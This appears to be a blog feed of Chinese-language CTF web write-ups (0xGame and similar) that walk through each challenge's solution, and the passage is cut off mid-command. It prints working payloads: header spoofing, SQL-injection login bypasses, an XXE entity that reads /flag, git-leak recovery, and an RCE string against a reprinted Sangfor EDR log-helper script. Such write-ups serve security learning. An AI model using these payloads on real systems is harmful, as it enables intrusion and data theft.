class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Do you konw GET &amp; POST ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>代码审计，get传参，post传参即可</p><h3 id="最终-2"><a href="#最终-2" class="headerlink" title="最终"></a>最终</h3><p>payload：<code>./?0xGame=acd666tql</code><br>post:<code>X1cT34m=acd666tql</code></p><p>问题解决：0xGame{Get_4nd_P0sT_1s_eA5y}</p><h2 id="wh1sper’s-secret-garden"><a href="#wh1sper’s-secret-garden" class="headerlink" title="wh1sper’s_secret_garden"></a>wh1sper’s_secret_garden</h2><h3 id="考察http协议"><a href="#考察http协议" class="headerlink" title="考察http协议"></a>考察http协议</h3><h4 id="题目地址：http-web-game-0xctf-com-30050"><a href="#题目地址：http-web-game-0xctf-com-30050" class="headerlink" title="题目地址：http://web.game.0xctf.com:30050/"></a>题目地址：<a href="http://web.game.0xctf.com:30050/">http://web.game.0xctf.com:30050/</a></h4><p>打开发现：</p><pre class="language-none"><code class="language-none">你需要使用wh1sper浏览器来访问什么？没有？没有wh1sper浏览器还想打web？</code></pre><p>抓包改包,浏览器改成wh1sper</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: web.game.0xctf.com:30050Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) wh1sper&#x2F;84.0.4147.135 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close</code></pre><p>然后发现</p><pre class="language-none"><code class="language-none">你需要来自：https:&#x2F;&#x2F;ctf.njupt.edu.cn&#x2F;</code></pre><p>伪造地址三种方式：</p><pre class="language-none"><code class="language-none">Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1Referer: 127.0.0.1</code></pre><p>这里<code>Referer: https://ctf.njupt.edu.cn/</code></p><p>再发包，发现</p><pre><code>你得从本地访问才行哟！</code></pre><p>改包，加上<code>X-Forwarded-For: 127.0.0.1</code></p><h3 id="最终-3"><a href="#最终-3" class="headerlink" title="最终"></a>最终</h3><p>发包：</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: web.game.0xctf.com:30050Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1Referer: https:&#x2F;&#x2F;ctf.njupt.edu.cn&#x2F;X-Forwarded-For: 127.0.0.1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) wh1sper&#x2F;84.0.4147.135 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close</code></pre><p>问题解决：0xGame{宁就是接头霸王?}</p><h2 id="readflag"><a href="#readflag" class="headerlink" title="readflag"></a>readflag</h2><h3 id="考察linux指令"><a href="#考察linux指令" class="headerlink" title="考察linux指令"></a>考察linux指令</h3><h4 id="题目地址：http-web-game-0xctf-com-30054"><a href="#题目地址：http-web-game-0xctf-com-30054" class="headerlink" title="题目地址：http://web.game.0xctf.com:30054/"></a>题目地址：<a href="http://web.game.0xctf.com:30054/">http://web.game.0xctf.com:30054/</a></h4><p>进去看到<code>请输入linux指令</code></p><h3 id="最终-4"><a href="#最终-4" class="headerlink" title="最终"></a>最终</h3><p>直接cat /flag</p><p>问题解决：0xGame{fl4g_1s_c0ntent}</p><h2 id="edr"><a href="#edr" class="headerlink" title="edr"></a>edr</h2><h3 id="考察edr和搜索引擎"><a href="#考察edr和搜索引擎" class="headerlink" title="考察edr和搜索引擎"></a>考察edr和搜索引擎</h3><h4 id="题目地址：http-web1-game-0xctf-com-40000"><a href="#题目地址：http-web1-game-0xctf-com-40000" class="headerlink" title="题目地址：http://web1.game.0xctf.com:40000/"></a>题目地址：<a href="http://web1.game.0xctf.com:40000/">http://web1.game.0xctf.com:40000/</a></h4><p>深信服edr的漏洞</p><p>这里有一篇介绍：<a class="url" href="https://www.weixiuzhan.cn/news/show-21463.html" target="_blank" rel="noopener noreferrer">https://www.weixiuzhan.cn/news/show-21463.html</a></p><p>源码在这</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * c.php * 查看ldb的日志 * 支持正则表达式过滤，可以过滤文件以及每行日志   */</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**   * 编解码      @param string $data 编解码数据        * @return string 返回编解码数据          /              $code = function($data) &#123;          for ($i = 0; $i &lt; strlen($data); ++$i) &#123;              $data[$i] = $data[$i] ^ 'G';          &#125;          return $data;              &#125;;/** * 加密请求 * @param string $site  站点 * @param string $query 请求串 * @return string 返回请求URL */</span><span class="token variable">$request</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$site</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$site</span></span>/<span class="token interpolation"><span class="token variable">$path</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 解密回复 * @param string $data 回复数据 * @return array 返回回复数据 */</span><span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$dec</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$dec</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 找到匹配的日志 * @param string $path 文件路径匹配 * @param string $item 日志项匹配 * @param string $topn TOP N  * @param string $host 主机 * @return array 返回匹配结果 */</span><span class="token variable">$collect</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$item</span><span class="token punctuation">,</span> <span class="token variable">$topn</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$response</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$path</span>   <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$item</span>   <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"http://127.0.0.1:8089"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"op=ll&amp;host=<span class="token interpolation"><span class="token variable">$host</span></span>&amp;path=<span class="token interpolation"><span class="token variable">$path</span></span>&amp;item=<span class="token interpolation"><span class="token variable">$item</span></span>&amp;top=<span class="token interpolation"><span class="token variable">$topn</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$response</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 显示某个表单域 * @param array $info 表单域信息, array("name" => "xx", "value" => "xxx", "note" => "help"); * @return */</span><span class="token variable">$show_input</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>&lt;font size=2><span class="token interpolation"><span class="token variable">$title</span></span>: &lt;/font>&lt;input type=\"text\" size=30 id=\"<span class="token interpolation"><span class="token variable">$name</span></span>\" name=\"<span class="token interpolation"><span class="token variable">$name</span></span>\" value=\"<span class="token interpolation"><span class="token variable">$value</span></span>\">&lt;font size=2><span class="token interpolation"><span class="token variable">$note</span></span>&lt;/font>&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 去掉反斜杠 * @param string $var 值 * @return string 返回去掉反斜杠的值 */</span><span class="token variable">$strip_slashes</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 显示表单 * @param array $params 请求参数 * @return */</span><span class="token variable">$show_form</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$strip_slashes</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$show_input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span>  <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>  <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>  <span class="token punctuation">:</span> <span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token variable">$path</span>  <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span>  <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span>  <span class="token punctuation">:</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token variable">$row</span>   <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>   <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>   <span class="token punctuation">:</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token comment">// 绘制表单</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;pre>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;form id="studio" name="studio" method="post" action="">'</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Host "</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"host"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$host</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - host, e.g. 127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Path "</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"path"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$path</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - path regex, e.g. mapreduce"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Row  "</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"row"</span><span class="token punctuation">,</span>   <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$row</span><span class="token punctuation">,</span>   <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - row regex, e.g. \s[w|e]\s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Limit"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"limit"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$limit</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - top n, e.g. 100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;input type="submit" id="button">'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;/form>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 入口函数 * @param array $argv 配置参数 * @return */</span><span class="token variable">$main</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span>     <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$collect</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$collect</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">,</span> <span class="token variable">$limit</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"success"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"success"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$host</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$items</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$last</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$items</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$last</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$last</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"\n[<span class="token interpolation"><span class="token variable">$host</span></span>] -> <span class="token interpolation"><span class="token variable">$last</span></span>\n\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">echo</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"item"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;html>&lt;head>&lt;meta http-equiv="Content-Type" Content="text/html; Charset=utf-8">&lt;/head>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;body bgcolor="#e8ddcb">'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>&lt;b>Log Helper&lt;/b>&lt;/p>"</span><span class="token punctuation">;</span><span class="token variable">$show_form</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;pre>"</span><span class="token punctuation">;</span><span class="token variable">$main</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>可以任意文件读取下载</p><h3>最终</h3>payload：./?strip_slashes=system&host=cat /flag<p>问题解决：0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y}</p><h2 id="just-login"><a href="#just-login" class="headerlink" title="just_login"></a>just_login</h2><h3 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h3><h4 id="题目地址：http-web-game-0xctf-com-30055"><a href="#题目地址：http-web-game-0xctf-com-30055" class="headerlink" title="题目地址：http://web.game.0xctf.com:30055/"></a>题目地址：<a href="http://web.game.0xctf.com:30055/">http://web.game.0xctf.com:30055/</a></h4><p>dirsearch扫不到东西</p><p>sqlmap跑一下没用</p><p>不知道干啥，直接burp抓包用户名爆破<br>真爆出来了</p><h3>最终</h3>payload：<pre class="language-none"><code class="language-none">&#39; or 0&#x3D;0 #&#39; or 1&#x3D;1 or &#39;&#39;&#x3D;&#39;x&#39; or 1&#x3D;1 or &#39;x&#39;&#x3D;&#39;y</code></pre><p>问题解决：0xGame{e5sy_sql_1njeCtion}</p><h2 id="close-eyes"><a href="#close-eyes" class="headerlink" title="close_eyes"></a>close_eyes</h2><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="题目地址：http-web-game-0xctf-com-30052"><a href="#题目地址：http-web-game-0xctf-com-30052" class="headerlink" title="题目地址：http://web.game.0xctf.com:30052/"></a>题目地址：<a href="http://web.game.0xctf.com:30052/">http://web.game.0xctf.com:30052/</a></h4><h2 id="inject-me"><a href="#inject-me" class="headerlink" title="inject_me"></a>inject_me</h2><h3 id="XXE显式攻击"><a href="#XXE显式攻击" class="headerlink" title="XXE显式攻击"></a>XXE显式攻击</h3><h4 id="题目地址：http-web-game-0xctf-com-30061"><a href="#题目地址：http-web-game-0xctf-com-30061" class="headerlink" title="题目地址：http://web.game.0xctf.com:30061/"></a>题目地址：<a href="http://web.game.0xctf.com:30061/">http://web.game.0xctf.com:30061/</a></h4><h3 id="最终-5"><a href="#最终-5" class="headerlink" title="最终"></a>最终</h3><p>payload：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">GVI</span> <span class="token punctuation">[</span><span class="token internal-subset"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "file:///flag" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>问题解决：0xGame{V2ry_simple_XXE}</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随缘的WEB Write-up</title>
      <link href="article/suiyuan/"/>
      <url>article/suiyuan/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><h2>WEB-常见的搜集</h2><h3>信息收集</h3>题目链接：<a class="url" href="http://10.147.19.176:7001/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7001/</a><hr />敏感文件Hello, CTFer!信息搜集之所以重要，是因为其往往会带给我们一些意想不到的东西<p>hack fun</p><hr /><h4>yysy,确实</h4>信息收集<h5>Part1</h5>遇事不决，先扫为敬真·找到了<pre><code>/.index.php.swp</code></pre>知识链接：.swp文件是备份文件，平时vim强退一定要注意.swp文件的删除！<p>进去访问下载<br><? php echo 'flag3:cDBydGFudF9oYWNr}';?></p><p>发现flag3，说明flag分为好多部分</p><h5>Part2</h5>扫描还扫到了<pre><code>/index.php~</code></pre>直接访问得flag2:c192M3J5X2lt<h5>Part3</h5>将扫描进行到底还扫到了<pre><code>/robots.txt</code></pre>进去康康<pre><code>User-agent: *Disallow:/flag1_is_her3_fun.txt</code></pre>访问得flag1:aW5mb18x<h3>最终</h3>组合得flag<h5>小结</h5>扫就完事了<h2>WEB-粗心的小李</h2><h3>Git泄露</h3>题目链接：<a class="url" href="http://10.147.19.176:7002/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7002/</a><hr />Git测试Hello, CTFer!当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。<p>小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(</p><p>very easy</p><hr /><h4>Git</h4>访问<code>./.git</code>发现跳转到了<code>./.git/</code>根据题目是git泄露<h5>神器Git Hack</h5>命令：<pre><code>$ python2 GitHack.py -u "http://10.147.19.176:7002/.git"</code></pre>扒下来.git文件<h5>分析</h5>命令看一下<pre><code>$ git log --reflogcommit 213b7e386e9b0b406d91fae58bf8be11a58c3f88 (HEAD -> master)Author: Veneno <593220746@qq.com>Date:   Wed Dec 4 11:04:14 2019 +0800<p>flag<br></code></pre><br>发现有flag<br>恢复一下（注意，这里要往上一个目录）</p><pre><code>$ git reset --hard 213b7e386e9b0b406d91fae58bf8be11a58c3f88HEAD is now at 213b7e3 flag</code></pre><p>恢复了<code>index.html</code></p><h3>最终</h3>在<code>index.html</code>里找到flag<p>问题解决：n1book{Z2l0X2xvb2tzX3MwX2Vhc3lmdW4}</p><h5>小结</h5>Git hack好用，还有个git extrack<hr /><h2>WEB-SQL注入-1</h2><h3>SQL注入</h3>题目链接：<a class="url" href="http://10.147.19.176:7004/login.php" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7004/login.php</a><hr /><h4>SQLmap真香</h4><h5>sql注入不说了</h5>sqlmap直接跑由于是POST测试，抓个包下来存文件，在name处改个<code>*</code>跑sqlmap<pre><code>$ python2 